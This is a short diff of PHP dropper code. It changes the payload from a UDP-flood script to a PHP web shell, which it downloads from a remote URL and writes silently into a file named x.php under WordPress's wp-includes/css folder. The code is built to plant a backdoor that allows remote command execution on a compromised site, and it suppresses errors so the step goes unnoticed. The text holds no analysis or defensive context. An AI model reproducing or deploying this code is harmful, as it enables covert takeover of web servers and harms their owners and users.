@@ -1,9 +1,9 @@
-$yol = $_SERVER["DOCUMENT_ROOT"]."/wp-includes/js/a.py";
+$yol = $_SERVER["DOCUMENT_ROOT"]."/wp-includes/css/x.php";
 if ( file_exists( $yol ) ) {
 unlink($yol);
 }else {
 @touch($yol);
-@$h = @file_get_contents("https://gist.githubusercontent.com/kjseefried/235ed540c064b021a607/raw/7ab13981ee511c0a032fc5a3109b1df1f6fc5dbf/udpflood.py");
+@$h = @file_get_contents("https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php");
 @$kayit = fopen($yol, "a"); 
 @fwrite($kayit,$h);
 @fwrite($kayit,"\r\r");
